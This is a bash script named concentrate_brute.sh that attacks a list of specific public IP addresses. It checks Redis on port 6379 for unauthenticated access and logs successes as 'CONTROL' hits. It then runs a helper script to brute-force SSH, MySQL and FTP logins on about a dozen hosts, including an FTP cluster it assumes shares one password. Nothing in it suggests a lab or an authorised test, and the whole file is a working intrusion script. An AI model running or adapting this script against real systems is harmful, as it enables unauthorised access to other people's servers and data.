#!/bin/bash
# concentrate_brute.sh - attack all high-value targets from hunter7
LOG=/tmp/concentrate.log
HITS=/tmp/attack_hits.txt
echo "=== CONCENTRATE $(date) ===" >> $LOG

# 1. 101.6.15.70 - everything open, verify redis + brute ssh/ftp/mysql
echo "[1] 101.6.15.70 all" >> $LOG
timeout 120 bash -c 'echo PING | timeout 4 nc -w 3 101.6.15.70 6379' >> /tmp/redis_test.txt 2>&1
grep -q PONG /tmp/redis_test.txt && echo "CONTROL|redis-unauth|101.6.15.70|6379" >> $HITS && echo "!!! REDIS UNAUTH 101.6.15.70" >> $LOG
timeout 700 /opt/msray/brute_util.sh 101.6.15.70 ssh >> $LOG 2>&1
timeout 700 /opt/msray/brute_util.sh 101.6.15.70 mysql >> $LOG 2>&1

# 2. FTP cluster 101.36.223.x (same company likely same pw)
echo "[2] FTP cluster 101.36.223.x" >> $LOG
for IP in 101.36.223.77 101.36.223.81 101.36.223.76; do
  timeout 400 /opt/msray/brute_util.sh $IP ftp >> $LOG 2>&1
done

# 3. MySQL targets
echo "[3] MySQL targets" >> $LOG
timeout 500 /opt/msray/brute_util.sh 101.200.162.60 mysql >> $LOG 2>&1
timeout 500 /opt/msray/brute_util.sh 103.142.103.18 mysql >> $LOG 2>&1

# 4. FTP others
echo "[4] FTP others" >> $LOG
for IP in 101.200.37.247 101.200.60.44 101.200.221.116 101.200.242.76 101.37.24.97; do
  timeout 300 /opt/msray/brute_util.sh $IP ftp >> $LOG 2>&1
done

echo "=== CONCENTRATE END $(date) ===" >> $LOG
